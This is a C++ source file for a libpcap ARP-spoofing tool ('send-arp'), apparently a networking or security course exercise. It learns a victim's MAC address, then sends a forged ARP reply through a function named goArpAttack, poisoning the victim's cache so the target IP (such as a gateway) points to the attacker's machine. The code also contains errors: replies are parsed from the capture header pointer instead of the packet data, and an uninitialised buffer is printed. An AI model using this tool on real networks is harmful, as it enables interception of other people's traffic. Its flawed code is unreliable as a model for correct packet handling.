#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>
#include <cstdlib>
#include <string>
#include <cstdbool>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

char*	device;
Mac		localMac;

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, int mode){ // mode: ArpHdr::Reply, ArpHdr::Request
	EthArpPacket packet;
	char  		 errbuf[PCAP_ERRBUF_SIZE];
	pcap_t*		 handle = pcap_open_live(device, 0, 0, 0, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
		exit(-1);
	}

	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_  = htons(ArpHdr::ETHER);
	packet.arp_.pro_  = htons(EthHdr::Ip4);
	packet.arp_.hln_  = Mac::SIZE;
	packet.arp_.pln_  = Ip::SIZE;
	packet.arp_.op_   = htons(mode);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_  = htonl(sip);
	packet.arp_.tmac_ = dmac;
	packet.arp_.tip_  = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}

void getLocalMac(){
	// https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
    string	target = string("/sys/class/net/") + string(device) + string("/address");
	char	lmac[] = "00:00:00:00:00:00";

	FILE *fp = fopen(target.c_str(), "r");
	if(fp == nullptr){
		char errbuf[PCAP_ERRBUF_SIZE];
		fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
		exit(-1);
	}

    fscanf(fp, "%s", lmac);
    localMac = Mac(lmac);

	printf("local mac address: %s\n", lmac);
	fclose(fp);
}

map<Ip, Mac> dataMap;
void getMacFromArp(Ip tip, Ip usingip){
	if(dataMap.find(tip) != dataMap.end()) return;

	sendArp(localMac, Mac("ff:ff:ff:ff:ff:ff"), usingip, tip, ArpHdr::Request);

	char  	errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
		exit(-1);
	}

    EthArpPacket  packet;
    const u_char* data;
    pcap_pkthdr*  temp;

	while(1){
        int res = pcap_next_ex(handle, &temp, &data);
		if(res==0) continue;
		if(res==-1 || res==-2){
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

        EthArpPacket* packetPtr = (EthArpPacket*)temp;
        packet = *packetPtr;

		if(packet.eth_.type_ != htons(EthHdr::Arp))	continue;
		if(packet.arp_.sip_  != htonl(tip)) 		continue;
		
		dataMap.insert( { Ip(ntohl(packet.arp_.sip_)), Mac(packet.arp_.smac_) } );
		break;
	}

	pcap_close(handle);
}

void goArpAttack(Ip sip, Ip tip){
	getMacFromArp(sip, tip);

	Mac smac = dataMap[sip];

	sendArp(localMac, smac, tip, sip, ArpHdr::Reply);
}

int main(int argc, char* argv[]) {
	if (argc <= 3 || argc % 2 == 1) {
		usage();
		return -1;
	}
	device = argv[1];

	getLocalMac();

	for(int i=2; i<argc; i+=2){
		goArpAttack(Ip(argv[i]), Ip(argv[i+1]));
	}
	
	return 0;
}
